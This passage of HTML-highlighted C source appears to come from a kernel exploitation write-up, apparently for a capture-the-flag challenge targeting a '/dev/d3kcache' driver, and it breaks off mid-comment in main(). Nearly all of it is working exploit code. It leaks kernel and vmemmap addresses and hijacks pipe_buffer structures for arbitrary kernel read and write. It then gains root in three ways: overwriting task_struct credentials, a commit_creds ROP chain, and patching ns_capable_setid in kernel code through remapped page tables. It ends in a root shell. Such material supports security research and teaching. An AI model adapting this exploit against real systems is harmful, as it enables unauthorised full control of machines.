class="hljs-number">0x070</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x070</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-57</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-56</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-57</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-50</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-50</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">363</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">377</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">363</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">364</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">377</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br><br><span class="hljs-type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;<br><span class="hljs-type">size_t</span> stack_addr, stack_addr_another;<br><span class="hljs-type">size_t</span> stack_page, mm_struct_page;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve_for_3_level</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    <span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br><br>    <span class="hljs-comment">/* read current task_struct */</span><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>    mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br><br>    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br><br>    <span class="hljs-comment">/* read mm_struct */</span><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br><br>    <span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>    pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span><br><span class="hljs-comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span><br><span class="hljs-comment"> * But what I want is a more novel and general exploitation that </span><br><span class="hljs-comment"> * doesn&#x27;t need any information about the kernel image. </span><br><span class="hljs-comment"> * So just simply overwrite the task_struct is good :)</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If you still want a normal ROP, refer to following codes.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff810157aa</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br>    <br>    <span class="hljs-comment">/* reading the page table directly to get physical addr of kernel stack*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading page table...&quot;</span>);<br><br>    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>    stack_addr_another += page_offset_base;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br><br>    <span class="hljs-comment">/* construct the ROP */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x100</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>        rop[idx++] = RET + kernel_offset;<br>    &#125;<br><br>    rop[idx++] = POP_RDI_RET + kernel_offset;<br>    rop[idx++] = INIT_CRED + kernel_offset;<br>    rop[idx++] = COMMIT_CREDS + kernel_offset;<br>    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>    stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_usma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span><br><br>    <span class="hljs-type">char</span> *kcode_map, *kcode_func;<br>    <span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br><br>    kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>        kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>           dst_vaddr);<br><br>    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br>    dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br><br>    <span class="hljs-comment">/* remapping to our mmap area */</span><br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* overwrite kernel code segment directly */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x40</span>); <span class="hljs-comment">/* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>) + <span class="hljs-number">0x40</span>, <br>            <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>            <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>            <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>            <span class="hljs-number">12</span>);<br><br>    <span class="hljs-comment">/* get root now :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Just for testing CFI&#x27;s availability :)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_control_flow_integrity_detection</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pbuf</span> =</span> (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)buf + TRD_PIPE_BUF_SZ);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>, *<span class="hljs-title">ops_addr</span>;</span><br><br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) <br>                 (((<span class="hljs-type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="hljs-number">0x40</span> * <span class="hljs-number">0x1000</span>);<br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*)((<span class="hljs-type">size_t</span>)ops_addr+page_offset_base);<br><br>    <span class="hljs-comment">/* two random gadget :) */</span><br>    ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) buf;<br>    ops-&gt;confirm = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff81a78568</span> + kernel_offset);<br>    ops-&gt;release = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff816196e6</span> + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        pbuf-&gt;ops = ops_addr;<br>        pbuf = (<span class="hljs-keyword">struct</span> pipe_buffer *)((<span class="hljs-type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);<br>    &#125;<br><br>    evil_2nd_buf.page = info_pipe_buf.page;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_4th_buf,<span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_2nd_buf,<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>        <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_3rd_buf,<span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], buf, <span class="hljs-number">0xf00</span>); <br><br>    <span class="hljs-comment">/* trigger CFI... */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);<br>    sleep(<span class="hljs-number">5</span>);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.O - fundamental works</span><br><span class="hljs-comment">     */</span><br><br>    save_status();<br><br>    <span class="hljs-comment">/* bind core to 0 */</span><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* dev file */</span><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pgv pages */</span><br>    prepare_pgv_system();<br>    prepare_pgv_pages();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span><br><span class="hljs-comment">     * making two pipe_buffer pointing to the same 